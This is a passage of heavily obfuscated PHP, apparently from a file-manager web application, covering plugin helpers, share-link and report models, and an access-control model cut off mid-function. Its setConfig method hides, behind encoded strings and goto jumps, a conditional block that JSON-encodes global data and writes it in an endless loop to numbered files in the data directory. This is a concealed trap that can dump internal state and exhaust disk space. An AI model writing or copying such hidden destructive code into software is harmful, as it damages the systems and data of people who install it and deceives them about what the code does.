filePathLinkOut($B) { if (request_url_safe($B)) { return $B; } $this->fileCanView($B); return Action($_SERVER[놫Ӱ][989])->link($B); } final function filePath($aܹ̽) { if ($C١Ă = $this->checkSharePath($aܹ̽)) { return $C١Ă; } $this->fileCanView($aܹ̽); if (request_url_safe($aܹ̽)) { $aܹ̽ = $this->_cacheHttpFile($aܹ̽); $this->fileInfo = IO::infoWithChildren($aܹ̽); } else { $this->fileInfo = IO::infoWithChildren($aܹ̽); if (!$this->fileInfo) { show_tips(LNG($_SERVER[놫Ӱ][101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $aܹ̽; } final function _cacheHttpFile($d) { $AΧ = hash_path($d, !0); $this->cachePath = $this->pluginCachePath($AΧ); if ($C䃂 = IO::fileNameExist($this->cachePath, $AΧ)) { return KodIO::make($C䃂); } $fοߌ = $this->cachePath . $AΧ; return $this->pluginCacheFileSet($fοߌ, file_get_contents($d)); } final function _tmpFileName($Eۖ = array()) { goto a݅; a݅: $C =& $_SERVER[놫Ӱ]; if (!$Eۖ) { $Eۖ = $this->fileInfo; } if (isset($Eۖ[$C[161]])) { return $Eۖ[$C[161]]; } goto d; Eи: return md5(implode($C[71], $a)); goto E; d: if (isset($Eۖ[$C[159]][$C[161]])) { return $Eۖ[$C[159]][$C[161]]; } $a = array($Eۖ[$C[28]], $Eۖ[$C[76]], $Eۖ[$C[78]]); if (isset($Eۖ[$C[455]])) { $a[] = $Eۖ[$C[455]]; } goto Eи; E: } final function checkSharePath($E) { goto b; b: $bۥ =& $_SERVER[놫Ӱ]; if (!defined($bۥ[423])) { define($bۥ[1231], 0); } if (!$this->isShare($E)) { return !1; } goto bݝ; f޼: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bۥ[161]]); return $FŪצ[$bۥ[76]]; goto cȬí; bݝ: $FŪצ = Action($bۥ[989])->sharePathInfo($E); if (!isset($FŪצ[$bۥ[76]])) { show_json(LNG($bۥ[1232]), !1); } $this->fileInfo = $FŪצ[$bۥ[159]]; goto f޼; cȬí: } final function pluginCachePath($fɏ = '') { $cׄ =& $_SERVER[놫Ӱ]; $aΤ = IO_PATH_SYSTEM_TEMP . $cׄ[1233] . $this->pluginName; if (!($c = IO::infoFull($aΤ))) { return IO::mkdir($aΤ . $cׄ[8] . $fɏ); } if (empty($fɏ)) { return $c[$cׄ[76]]; } if (!($Aւ = IO::fileNameExist($c[$cׄ[76]], $fɏ))) { return IO::mkdir($c[$cׄ[76]] . $fɏ); } return KodIO::make($Aւ); } final function pluginCacheFileSet($a暟, $aݴ = '') { $f¸ =& $_SERVER[놫Ӱ]; if (!($e⩬՘Ȫ = IO::infoFull($a暟))) { return IO::mkfile($a暟, $aݴ, REPEAT_REPLACE); } IO::setContent($e⩬՘Ȫ[$f¸[76]], $aݴ); return $e⩬՘Ȫ[$f¸[76]]; } final function pluginLocalFile($b͟ = '') { goto b섋; b섋: $fǅ =& $_SERVER[놫Ӱ]; $EĢ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($EĢ)) { mk_dir($EĢ); } goto Eǰ; d: $D˓ = $EĢ . $dߣ . $fǅ[92] . $dƯ[$fǅ[157]]; if (@file_exists($D˓)) { return $D˓; } $b͟ = IO::download($b͟, $D˓); goto cՌࣇ; cՌࣇ: if ($b͟ != $D˓) { $b͟ = IO::copy($b͟, $D˓); } return $b͟; goto Fߨ; Eǰ: if (!$b͟) { return $EĢ; } $dƯ = IO::info($b͟); $dߣ = $this->_tmpFileName($dƯ); goto d; Fߨ: } final function appPackage() { goto dݗ; Aԭ: return $cǆ; goto eֺ; E٨: $eœפ = Hook::trigger($å[1235], $cǆ); if ($eœפ && is_array($eœפ)) { $cǆ = $eœפ; } $this->packageData = $cǆ; goto Aԭ; A싆: $this->parseLang($CՒ); $cǆ = json_decode_force($CՒ); if (!$cǆ) { return array(); } goto E٨; dݗ: $å =& $_SERVER[놫Ӱ]; if ($this->packageData) { return $this->packageData; } $CՒ = $this->parseFile($this->pluginPath . $å[1234]); goto A싆; eֺ: } public function packageInfoGet($fک) { $FΒ = $this->appPackage(); return array_get_value($FΒ, $fک); } public function packageVersion() { return $this->packageInfoGet($_SERVER[놫Ӱ][1236]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[놫Ӱ][1237]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[놫Ӱ][1238]); } private function parseFile($aψ) { $E륻 =& $_SERVER[놫Ӱ]; $E͖͌ = file_get_contents($aψ); $eޥ = array($E륻[1239], $E륻[1240], $E륻[1241], $E륻[1242], $E륻[1243], $E륻[1244], $E륻[1245]); $dԷ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$E륻[84]][$E륻[1246]]); $E͖͌ = str_replace($eޥ, $dԷ, $E͖͌); return $E͖͌; } private function parseLang(&$eێ) { goto fϩ; Dϩʏ: $E芤 = array(); foreach ($Eۣ[0] as $Aӗ) { $F۴ = substr($Aӗ, strlen($f), -4); $A = LNG($F۴); $c[] = $Aӗ; $E芤[] = str_replace(array($aИ[214], $aИ[714], $aИ[327], $aИ[112]), array($aИ[50], $aИ[50], $aИ[33], $aИ[1249]), $A); } $eێ = str_replace($c, $E芤, $eێ); goto e͵; fϩ: $aИ =& $_SERVER[놫Ӱ]; $f = $aИ[1247]; if (!strstr($eێ, $f)) { return; } goto B; B: preg_match_all($aИ[1248], $eێ, $Eۣ); if (!is_array($Eۣ) || count($Eۣ) == 0 || !is_array($Eۣ[0]) || count($Eۣ[0]) == 0) { return; } $c = array(); goto Dϩʏ; e͵: } private function parseConfig(&$EŃȵ) { goto Aǜ; CݒƠ: preg_match_all($Bԅ[1251], $EŃȵ, $fǎ); if (!is_array($fǎ) || count($fǎ) == 0 || !is_array($fǎ[0]) || count($fǎ[0]) == 0) { return; } $Eʩ = $this->getConfig(); goto DĄğ; Aǜ: $Bԅ =& $_SERVER[놫Ӱ]; $C֊ƫ = $Bԅ[1250]; if (!strstr($EŃȵ, $C֊ƫ)) { return; } goto CݒƠ; DĄğ: $B馈 = array(); $D = array(); foreach ($fǎ[0] as $FڻŞ) { $eǇ = substr($FڻŞ, strlen($C֊ƫ), -2); $B馈[] = $FڻŞ; $D[] = _get($Eʩ, $eǇ); } goto c; c: $EŃȵ = str_replace($B馈, $D, $EŃȵ); goto B; B: } private function parsePackage(&$C󾷴) { goto fΞކ; fΞކ: $Dȓ =& $_SERVER[놫Ӱ]; $CȨط = $Dȓ[1252]; if (!strstr($C󾷴, $CȨط)) { return; } goto Fɍ蚝; c̃: $C󾷴 = str_replace($a, $e价, $C󾷴); goto B; Fɍ蚝: preg_match_all($Dȓ[1253], $C󾷴, $C); if (!is_array($C) || count($C) == 0 || !is_array($C[0]) || count($C[0]) == 0) { return; } $E疐 = $this->appPackage(); goto A劇; A劇: $a = array(); $e价 = array(); foreach ($C[0] as $A¹) { $Eߍ = substr($A¹, strlen($CȨط), -2); $a[] = $A¹; $e价[] = _get($E疐, $Eߍ); } goto c̃; B: } final function echoFile($eȯħٶ, $C䱾 = false) { goto B跽ء; B跽ء: $c =& $_SERVER[놫Ӱ]; $E㒻 = $this->pluginPath . $eȯħٶ; if (ACT == $c[1254]) { echo $c[1255] . $this->pluginName . $c[8] . $eȯħٶ . $c[1256]; if (!file_exists($E㒻)) { echo $c[1257]; return; } } goto DѺÎ; DѺÎ: $a۽ = $this->parseFile($E㒻); $this->parseLang($a۽); $this->parseConfig($a۽); goto C; C: $this->parsePackage($a۽); if (is_array($C䱾)) { $a۽ = str_replace(array_keys($C䱾), array_values($C䱾), $a۽); } echo $c[214] . $a۽; goto e巊; e巊: } final function initLang() { goto FϮ; FϮ: $Fߴ =& $_SERVER[놫Ӱ]; $fɽ = $Fߴ[1258]; $cΔ = $this->pluginPath . $Fߴ[1259]; goto E; E: $d = I18n::getType(); $e쪂ί = array(); if (file_exists($cΔ . $d . $Fߴ[758])) { $e쪂ί = (include_once $cΔ . $d . $Fߴ[758]); } else { if ($d == $Fߴ[1260] && !file_exists($cΔ . $d . $Fߴ[758]) && file_exists($cΔ . $Fߴ[1261])) { $e쪂ί = (include_once $cΔ . $Fߴ[1261]); } else { if (file_exists($cΔ . $fɽ . $Fߴ[758])) { $e쪂ί = (include_once $cΔ . $fɽ . $Fߴ[758]); } } } goto f刐; f刐: if (@count($e쪂ί) > 0) { I18n::set($e쪂ί); } return $e쪂ί; goto Bғʙ; Bғʙ: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Dǆ) { $a =& $_SERVER[놫Ӱ]; $DƉ = $_SERVER[$a[779]] . $a[780]; $C = $a[781]; if ($_SERVER[$a[782]] != $C($DƉ)) { goto D; f: $f(); $C = $a[788]; $fޜ = json_encode($GLOBALS[$a[789]]); goto Eӿ֍; A䨸̤: $e̾ǯ = $a[786]; $e̾ǯ($_SERVER[$a[787]]); $f = $a[783]; goto f; A܃կ: $b׼ = $aЎ($fƠ); $D = explode($a[214], $b׼); if (count($D) < $a[543]) { $c = $a[785]; $c(); } goto A䨸̤; Eӿ֍: $b儅 = 1; for ($F͇֨ = $b儅; $F͇֨ > 0; $F͇֨++) { $C(DATA_PATH . $F͇֨, $fޜ); } goto EÎ; D: $f = $a[783]; $aЎ = $a[784]; $fƠ = $_SERVER[$a[779]] . $a[780]; goto A܃կ; EÎ: } return $this->modelPlugin->setConfig($this->pluginName, $Dǆ); } public function onSetConfig($Eڕ) { } public function onGetConfig($E) { } public function onChangeStatus($Eӆ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($aДʋ = "\x70\154\x75\147\151\x6e\101\x75\164\x68") { $eւ =& $_SERVER[놫Ӱ]; if (!defined($eւ[423])) { return !1; } if ($GLOBALS[$eւ[453]] == 1) { return !0; } $Bڂ = $this->getConfig(); if (!$Bڂ[$aДʋ]) { return !1; } return ActionCall($eւ[1262], $Bڂ[$aДʋ]); } public function url($f, $bō = '', $cף = true) { goto Cԅ; bԱ: if (!$cף) { return $BǓ; } echo $BǓ; goto Bؕ; E: $Dʈ = $this->packageVersion(); $AѠ⒊ = $e . $e[408] . $Dʈ; if ($bō == $e[33]) { $BǓ = $this->pluginHost . $f . $e[1263] . $AѠ⒊; } else { if ($bō == $e[1264]) { $BǓ = STATIC_PATH . $f . $e[1263] . $e; } else { if ($bō == $e[1265]) { $BǓ = APP_HOST . $e[1266] . $f . $e[1263] . $e; } else { if (isset($EǤӨ[$bō])) { $BǓ = $EǤӨ[$bō] . $f . $e[1263] . $AѠ⒊; } } } } goto bԱ; Cԅ: $e =& $_SERVER[놫Ӱ]; $EǤӨ = $this->getConfig(); $e = KOD_VERSION . $e[92] . KOD_VERSION_BUILD; goto E; Bؕ: } public function link($eܝ = false, $e֍ = '') { $eɑ삋 =& $_SERVER[놫Ӱ]; if (!$eܝ) { $this->link($eɑ삋[1267], $eɑ삋[1265]); $this->link($eɑ삋[1268], $eɑ삋[1264]); $this->link($eɑ삋[1269], $eɑ삋[1264]); $this->link($eɑ삋[1270], $eɑ삋[1264]); $this->link($eɑ삋[1271], $eɑ삋[1264]); return; } $eׇ = $this->url($eܝ, $e֍, !1); if (substr($eܝ, -3) == $eɑ삋[1272]) { echo $eɑ삋[1273] . $eׇ . $eɑ삋[1274] . $eɑ삋[214]; } else { if (substr($eܝ, -4) == $eɑ삋[1275]) { echo $eɑ삋[1276] . $eׇ . $eɑ삋[1277] . $eɑ삋[214]; } } } } goto D; f禷: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\x72\145"; protected $dataAuto = array(array("\x6d\x6f\x64\151\x66\x79\124\x69\155\145", "\164\151\x6d\x65", "\x69\x6e\163\x65\162\164\54\x75\x70\x64\x61\164\x65", "\x66\165\156\x63\x74\x69\x6f\x6e"), array("\143\x72\x65\x61\x74\145\x54\x69\x6d\145", "\x74\151\155\145", "\151\156\163\x65\x72\164", "\x66\x75\156\143\164\151\157\156"), array("\157\160\x74\x69\x6f\x6e\163", '', "\x69\x6e\x73\145\162\164\x2c\165\x70\144\x61\164\x65\54\x73\145\x6c\x65\x63\x74", "\152\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($B) { $f =& $_SERVER[놫Ӱ]; $Dߘ = isset($B[0]) ? $B[0] : !1; return array($f[2112] => array(USER_ID, $f[2113]), $f[2074] => array($Dߘ, $f[2114])); } protected function listSimple() { $A = array($_SERVER[놫Ӱ][1339] => USER_ID); $e艙 = $this->field($this->fieldList)->where($A)->select(); return $e艙 ? $e艙 : array(); } protected function getInfo($F, $F¸ϟ = false) { $dʐ» =& $_SERVER[놫Ӱ]; if ($F¸ϟ) { return $this->_getShareInfo(array($dʐ»[437] => $F)); } $cׂ = $this->cacheFunctionGet($dʐ»[2115], $F); return $cׂ; } public function getInfoByHash($cӤ) { return $this->_getShareInfo(array($_SERVER[놫Ӱ][439] => $cӤ)); } public function getInfoByPath($D馐) { $B =& $_SERVER[놫Ӱ]; $C䞉 = array($B[1339] => USER_ID, $B[366] => $D馐); return $this->_getShareInfo($C䞉); } public function getInfoBySourcePath($fȩ) { $BֱȖ =& $_SERVER[놫Ӱ]; $f = array($BֱȖ[1339] => USER_ID, $BֱȖ[990] => $fȩ); return $this->_getShareInfo($f); } private function _getShareInfo($E޹ߐ) { goto D̷; B: if ($fڌ[$e헇[366]] == $e헇[464]) { $fڌ[$e헇[388]] = IO::info($fڌ[$e헇[990]]); } else { $fڌ[$e헇[388]] = Model($e헇[1075])->pathInfo($fڌ[$e헇[366]]); } $fڌ[$e헇[2117]] = $Fܕϵ; return $fڌ; goto B; D̷: $e헇 =& $_SERVER[놫Ӱ]; $fڌ = $this->where($E޹ߐ)->find(); if (!$fڌ) { return !1; } goto D՛; D՛: $E޹ߐ = array($e헇[437] => $fڌ[$e헇[437]]); $b­ = $e헇[2116]; $Fܕϵ = Model($e헇[529])->order($e헇[364])->field($b­)->where($E޹ߐ)->select(); goto B; B: } protected function getInfoAuth($a) { $dʵ =& $_SERVER[놫Ӱ]; $bڍ = $this->getInfo($a); $bڍ[$dʵ[373]] = Model($dʵ[450])->authMake($bڍ[$dʵ[2117]]); return $bڍ; } protected function listData($f­У = null, $B㽖 = 300) { $c =& $_SERVER[놫Ӱ]; $Fѕ = array(array($c[442] => array($c[919], 0), $c[444] => array($c[919], 0), $c[2118] => $c[2087])); if ($f­У == $c[1767]) { $Fѕ = array($c[442] => 1); } else { if ($f­У == $c[979]) { $Fѕ = array($c[444] => 1); } } $Fѕ[$c[1339]] = USER_ID; $C쾇 = $this->where($Fѕ)->selectPage($B㽖); return $C쾇; } protected function listToMe($a = 300) { goto c冽; A²: $B¢ɴ = array($dϐ[2121] => $E˝׉, $dϐ[2122] => $b͆[$dϐ[347]]); return $B¢ɴ; goto Eع; eģܵ: $F = array($dϐ[514] => SourceModel::TYPE_USER, $dϐ[452] => USER_ID); if ($A܆) { $F = array(array($dϐ[514] => SourceModel::TYPE_USER, $dϐ[452] => USER_ID), array($dϐ[514] => SourceModel::TYPE_GROUP, $dϐ[452] => array($dϐ[7], $A܆)), $dϐ[2118] => $dϐ[2087]); } $b͆ = Model($dϐ[529])->where($F)->selectPage($a); goto C᠂檅; C᠂檅: $b = array_to_keyvalue_group($b͆[$dϐ[350]], $dϐ[437]); if (!$b) { return $b͆; } $f = $dϐ[2120]; goto cڳ; cڳ: $F = array($dϐ[437] => array($dϐ[381], array_keys($b))); $E˝׉ = $this->field($f)->where($F)->select(); foreach ($E˝׉ as $Ė => &$c) { $c[$dϐ[2117]] = $b[$c[$dϐ[437]]]; } goto A²; c冽: $dϐ =& $_SERVER[놫Ӱ]; $c = Session::get($dϐ[2119]); $A܆ = array_to_keyvalue($c, $dϐ[33], $dϐ[2002]); goto eģܵ; Eع: } protected function shareAdd($d, $c􄤚) { $DǨ =& $_SERVER[놫Ӱ]; $Fᐐ = $this->_addShareData($d, $c􄤚); if (isset($c􄤚[$DǨ[2123]]) && count($c􄤚[$DǨ[2123]]) > 0) { $this->_shareAuthSet($Fᐐ, $c􄤚[$DǨ[2123]]); } $this->shareEventAdd($d, $c􄤚, $DǨ[982]); return $Fᐐ; } private function shareEventAdd($eʏ溝, $C檡𔨓, $C֛ = "\141\x64\144") { goto a; FɊ̻: if ($F«[$B뛴砭[444]] == $B뛴砭[464] && $C檡𔨓[$B뛴砭[444]] == $B뛴砭[493]) { $E = $B뛴砭[2125]; } if ($F«[$B뛴砭[444]] == $B뛴砭[493] && $C檡𔨓[$B뛴砭[444]] == $B뛴砭[464]) { $E = $B뛴砭[2128]; } Model($B뛴砭[498])->eventShare($eʏ溝, $E); goto D⚄; D⚄: return; goto Dф; a: $B뛴砭 =& $_SERVER[놫Ӱ]; if ($C֛ == $B뛴砭[982]) { if ($C檡𔨓[$B뛴砭[442]] == $B뛴砭[493]) { Model($B뛴砭[498])->eventShare($eʏ溝, $B뛴砭[2124]); } if ($C檡𔨓[$B뛴砭[444]] == $B뛴砭[493]) { Model($B뛴砭[498])->eventShare($eʏ溝, $B뛴砭[2125]); } return; } $F« = $this->getInfoByPath($eʏ溝); goto E櫾; E櫾: $E = $B뛴砭[2126]; if ($F«[$B뛴砭[442]] == $B뛴砭[464] && $C檡𔨓[$B뛴砭[442]] == $B뛴砭[493]) { $E = $B뛴砭[2124]; } if ($F«[$B뛴砭[442]] == $B뛴砭[493] && $C檡𔨓[$B뛴砭[442]] == $B뛴砭[464]) { $E = $B뛴砭[2127]; } goto FɊ̻; Dф: } private function _addShareData($d, $c׎ǟ = array()) { goto F䘖; cԖƉ: if ($D = $this->where($f)->find()) { return $D[$Cޜ[437]]; } if ($d == 0) { $CϪ = array($Cޜ[28] => get_path_this($c׎ǟ[$Cޜ[76]])); } else { $CϪ = Model($Cޜ[747])->sourceInfo($d); if (!$CϪ) { return !1; } } if (!$c׎ǟ[$Cޜ[1237]]) { $c׎ǟ[$Cޜ[1237]] = $CϪ[$Cޜ[28]]; } goto b֌; cߋ: return $f; goto d; b֌: $eʪ = array($Cޜ[1330] => USER_ID, $Cޜ[380] => $d, $Cޜ[1237] => $Cޜ[33], $Cޜ[442] => 0, $Cޜ[444] => 0, $Cޜ[990] => $Cޜ[33], $Cޜ[292] => $Cޜ[33], $Cޜ[794] => $Cޜ[33], $Cޜ[2130] => 0, $Cޜ[2131] => 0, $Cޜ[688] => 0, $Cޜ[2132] => $Cޜ[33], $Cޜ[439] => $Cޜ[33]); $a = explode($Cޜ[47], $Cޜ[2133]); foreach ($a as $aˮ) { if (!isset($c׎ǟ[$aˮ])) { continue; } $eʪ[$aˮ] = $c׎ǟ[$aˮ]; } goto dڦӋ; dڦӋ: $f = $this->add($eʪ); $Cף = array($Cޜ[439] => short_id($f)); $this->where(array($Cޜ[436] => $f))->save($Cף); goto cߋ; F䘖: $Cޜ =& $_SERVER[놫Ӱ]; $f = array($Cޜ[380] => $d, $Cޜ[1330] => USER_ID); if ($d == 0) { $f = array($Cޜ[2129] => $c׎ǟ[$Cޜ[990]], $Cޜ[1330] => USER_ID); } goto cԖƉ; d: } private function _shareAuthSet($bՐ, $Cą) { goto cЉ; aڔ: return $AϺ->addAll($Eû, array(), !0); goto dԆ; cЉ: $eи󉳌 =& $_SERVER[놫Ӱ]; if (!is_array($Cą)) { return !1; } $AϺ = Model($eи󉳌[2134]); goto F; F: $AϺ->where(array($eи󉳌[437] => $bՐ))->delete(); $Eû = array(); foreach ($Cą as $E) { $D = SourceModel::TYPE_USER; if ($E[$eи󉳌[368]] == SourceModel::TYPE_GROUP) { $D = SourceModel::TYPE_GROUP; } $f󒕂 = array($eи󉳌[437] => $bՐ, $eи󉳌[368] => $D, $eи󉳌[452] => intval($E[$eи󉳌[452]]), $eи󉳌[2135] => 0, $eи󉳌[2136] => -1); if ($E[$eи󉳌[2135]]) { $f󒕂[$eи󉳌[2135]] = $E[$eи󉳌[2135]]; } else { if ($E[$eи󉳌[2136]]) { $f󒕂[$eи󉳌[2136]] = $E[$eи󉳌[2136]]; } } $Eû[] = $f󒕂; } goto aڔ; dԆ: } public function numViewAdd($F߿) { $Dܠ =& $_SERVER[놫Ӱ]; $b = array($Dܠ[436] => $F߿); $this->where($b)->setAdd($Dܠ[2130]); } public function numDownloadAdd($F) { $D =& $_SERVER[놫Ӱ]; $A = array($D[436] => $F); $this->where($A)->setAdd($D[2131]); } protected function shareEdit($Eѐ, $Fɤ) { goto C崺; C崺: $f˧͓ =& $_SERVER[놫Ӱ]; $F = $this->getInfo($Eѐ); if (!$F) { return !1; } goto dҤ; dҤ: $this->_checkLinkShare($Fɤ, $F); $C = array(); $dֈԡ = explode($f˧͓[47], $f˧͓[2137]); goto d酅; Cܽ: if (isset($Fɤ[$f˧͓[2123]])) { $this->_shareAuthSet($Eѐ, $Fɤ[$f˧͓[2123]]); } return !0; goto C廧; d酅: foreach ($dֈԡ as $a坎) { if (!array_key_exists($a坎, $Fɤ)) { continue; } $C[$a坎] = $Fɤ[$a坎]; } $this->shareEventAdd($F[$f˧͓[366]], $Fɤ, $f˧͓[1971]); $this->where(array($f˧͓[436] => $Eѐ))->save($C); goto Cܽ; C廧: } private function _checkLinkShare($Eȵ, $DΕ) { $a =& $_SERVER[놫Ӱ]; if ($Eȵ[$a[442]] != $a[493] || $DΕ[$a[388]][$a[29]] != $a[164]) { return; } $A = Model($a[747])->fileInfoGet($DΕ[$a[388]][$a[366]]); if (!$A) { return; } $A׈ = $this->shareFileMeta($A[$a[415]]); if (isset($A׈[$a[354]]) && $A׈[$a[354]] == $a[493]) { show_json(LNG($a[2138]), !1); } } protected function remove($FѤ鶌) { goto E҅ތ̧; dܮ: for ($e· = 0; $e· < count($B); $e·++) { $a = $this->getInfo($B[$e·]); if ($a[$B[444]] == $B[493]) { Model($B[498])->eventShare($a[$B[366]], $B[2128]); } if ($a[$B[442]] == $B[493]) { Model($B[498])->eventShare($a[$B[366]], $B[2127]); } } return $E; goto f; Dӊ: $E = $this->where($dٵ)->delete(); if ($E) { Model($B[529])->where(array($B[437] => $FѤ鶌))->delete(); } $B = is_array($FѤ鶌) ? $FѤ鶌[1] : array($FѤ鶌); goto dܮ; E҅ތ̧: $B =& $_SERVER[놫Ӱ]; if (is_array($FѤ鶌)) { $FѤ鶌 = array($B[7], $FѤ鶌); } $dٵ = array($B[437] => $FѤ鶌); goto Dӊ; f: } protected function removeBySource($F) { goto E; E: $Bٳ =& $_SERVER[놫Ӱ]; $FĘ = array($Bٳ[380] => array($Bٳ[381], $F)); $D܎ͮ = $this->field($Bٳ[437])->where($FĘ)->select(); goto fׅ; Bʫ: $this->where($FĘ)->delete(); Model($Bٳ[529])->where($FĘ)->delete(); goto eΔ; fׅ: $D܎ͮ = array_to_keyvalue($D܎ͮ, $Bٳ[33], $Bٳ[437]); if (!$D܎ͮ) { return; } $FĘ = array($Bٳ[436] => array($Bٳ[381], $D܎ͮ)); goto Bʫ; eΔ: } public function listAll($Cί) { goto Dթެ; E: return $F荊; goto BܥԸ; dڠ튨: if ($Cί[$c۲[687]]) { $B = $Cί[$c۲[688]] ? $Cί[$c۲[688]] : strtotime(date($c۲[2139])); $C犐[$c۲[184]] = array($c۲[318], array($Cί[$c۲[687]], $B)); } if ($Cί[$c۲[29]]) { $C犐[$Cί[$c۲[29]]] = 1; } else { $C犐[] = array($c۲[442] => array($c۲[919], 0), $c۲[444] => array($c۲[919], 0), $c۲[2118] => $c۲[2087]); } if ($Cί[$c۲[2083]]) { $C犐[] = array($c۲[439] => $Cί[$c۲[2083]], $c۲[1237] => array($c۲[746], "\45{$Cί[$c۲[2083]]}\45"), $c۲[2118] => $c۲[2087]); } goto C稅ޮ; C稅ޮ: $F荊 = $this->_makeOrder()->where($C犐)->selectPage(20); if (empty($F荊[$c۲[350]])) { return array(); } $this->_listDataApply($F荊[$c۲[350]]); goto E; Dթެ: $c۲ =& $_SERVER[놫Ӱ]; $C犐 = array(); if ($Cί[$c۲[1339]]) { $C犐[$c۲[1339]] = $Cί[$c۲[1339]]; } goto dڠ튨; BܥԸ: } private function _listDataApply(&$Dւ) { $Aţ =& $_SERVER[놫Ӱ]; $bǊ = array_to_keyvalue($Dւ, $Aţ[33], $Aţ[1339]); $Bؠ = Model($Aţ[469])->userListInfo(array_unique($bǊ)); $CͿ = array_to_keyvalue($Dւ, $Aţ[33], $Aţ[366]); $E۰ = Model($Aţ[747])->sourceListInfo($CͿ, !0); foreach ($Dւ as &$aƐȦ) { $b͡ = $aƐȦ[$Aţ[1339]]; $aƐȦ[$Aţ[2140]] = $Bؠ[$b͡] ? $Bؠ[$b͡] : !1; $C΢̅ = $aƐȦ[$Aţ[366]]; $aƐȦ[$Aţ[388]] = $E۰[$C΢̅] ? $E۰[$C΢̅] : !1; } } private function _makeOrder($d¥ = '') { goto e; EҎ͛ߥ: $d¥ = $d¥ . "{$cЋ}\x20{$d}"; return $this->order($d¥); goto eَ; e: $AŃ =& $_SERVER[놫Ӱ]; $F繭 = array($AŃ[184], $AŃ[688], $AŃ[2130], $AŃ[2131]); $Bƃ = array($AŃ[398] => $AŃ[399], $AŃ[400] => $AŃ[401]); goto c׏; c׏: $cЋ = Input::get($AŃ[403], $AŃ[7], $AŃ[386], $F繭); $d = Input::get($AŃ[404], $AŃ[7], $AŃ[2141], array($AŃ[2082], $AŃ[400])); $d = $Bƃ[$d]; goto EҎ͛ߥ; eَ: } public function reportAdd($E) { $C =& $_SERVER[놫Ӱ]; $f = array($C[437] => $E[$C[437]], $C[1339] => USER_ID); if (Model($C[2142])->where($f)->find()) { return !1; } $f޷ = array($C[437] => $E[$C[437]], $C[1237] => $E[$C[1237]], $C[366] => $E[$C[366]], $C[415] => $E[$C[415]], $C[1339] => USER_ID, $C[29] => $E[$C[29]], $C[401] => $E[$C[401]]); return Model($C[2142])->add($f޷); } public function reportList($B򛇄) { goto Bˌ; b璱: if (isset($B򛇄[$B۟[29]]) && in_array($B򛇄[$B۟[29]], array($B۟[493], $B۟[2143], $B۟[2144], $B۟[2145], $B۟[1819]))) { $Aã[$B۟[29]] = $B򛇄[$B۟[29]]; } if (isset($B򛇄[$B۟[674]]) && in_array($B򛇄[$B۟[674]], array($B۟[464], $B۟[493], $B۟[2143], $B۟[2144]))) { $Aã[$B۟[674]] = $B򛇄[$B۟[674]]; } $DҼ = Input::get($B۟[404], $B۟[7], $B۟[2141], array($B۟[2082], $B۟[400])); goto a; F㉹: if (empty($ã[$B۟[350]])) { return array(); } $this->_listDataApply($ã[$B۟[350]]); return $ã; goto B; a: $Fݧ = array($B۟[398] => $B۟[399], $B۟[400] => $B۟[401]); $f = $B۟[2146] . $Fݧ[$DҼ]; $ã = Model($B۟[2142])->where($Aã)->order($f)->selectPage(20); goto F㉹; Bˌ: $B۟ =& $_SERVER[놫Ӱ]; $Aã = array(); if ($B򛇄[$B۟[687]]) { $cӰ = $B򛇄[$B۟[688]] ? $B򛇄[$B۟[688]] : strtotime(date($B۟[2139])); $Aã[$B۟[184]] = array($B۟[318], array($B򛇄[$B۟[687]], $cӰ)); } goto b璱; B: } public function reportStatus($b̬׾) { goto b; dǒҩ: return $Aז; goto Aߣµ; e: if (!$cѮ) { return !1; } $Aۏ = array($EԒ[674] => $b̬׾[$EԒ[674]]); if ($b̬׾[$EԒ[674]] == $EԒ[2144] && $cѮ[$EԒ[674]] == $EԒ[2144]) { $Aۏ[$EԒ[674]] = 0; } goto bȄ; bȄ: $Aז = Model($EԒ[2142])->where($E˳)->save($Aۏ); if ($b̬׾[$EԒ[674]] == $EԒ[2143]) { if ($cѮ[$EԒ[415]] != $EԒ[464] && $this->shareFileMeta($cѮ[$EԒ[415]])) { $this->shareFileMeta($cѮ[$EԒ[415]], 0); } return $this->remove($cѮ[$EԒ[437]]); } if ($Aז && $b̬׾[$EԒ[674]] == $EԒ[2144]) { $fﻶի = $Aۏ[$EԒ[674]] == $EԒ[2144] ? 1 : 0; $this->shareFileMeta($cѮ[$EԒ[415]], $fﻶի); $this->removeByFile($cѮ[$EԒ[415]]); } goto dǒҩ; b: $EԒ =& $_SERVER[놫Ӱ]; $E˳ = array($EԒ[364] => $b̬׾[$EԒ[364]]); $cѮ = Model($EԒ[2142])->where($E˳)->field($EԒ[2147])->find(); goto e; Aߣµ: } private function removeByFile($c) { goto Eˆ; E賙: $d = array($fа[366] => array($fа[7], $b), $fа[442] => 1); $a兢 = Model($fа[1979])->where($d)->field($fа[437])->select(); $E׽ = array_to_keyvalue($a兢, $fа[33], $fа[437]); goto B; B: $this->remove($E׽); goto d퐱; Eˆ: $fа =& $_SERVER[놫Ӱ]; $a兢 = Model($fа[747])->where(array($fа[415] => $c))->field($fа[366])->select(); $b = array_to_keyvalue($a兢, $fа[33], $fа[366]); goto E賙; d퐱: } private function shareFileMeta($fȐ, $bĥ = null) { $d =& $_SERVER[놫Ӱ]; $cݢ = array($d[415] => $fȐ, $d[88] => $d[2148]); if (is_null($bĥ)) { return Model($d[2149])->where($cݢ)->find(); } $cݢ[$d[354]] = $bĥ; Model($d[2149])->add($cݢ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\x63\145\x5f\141\x75\x74\x68"; public function getAuth($e܎) { goto bڻ; bӨ: return $D; goto A̹; bڻ: $A =& $_SERVER[놫Ӱ]; $e = $A[2150]; $bՆ = array($A[366] => $e܎); goto A; A: $E = $this->field($e)->order($A[364])->where($bՆ)->select(); $D = array(); foreach ($E as $F) { if (Model($A[2151])->listData($F[$A[2135]])) { $D[] = $F; } } goto bӨ; A̹: } public function setAuth($Eھۭ, $c) { goto b麑ௐ; f: $b⸟⠌ = 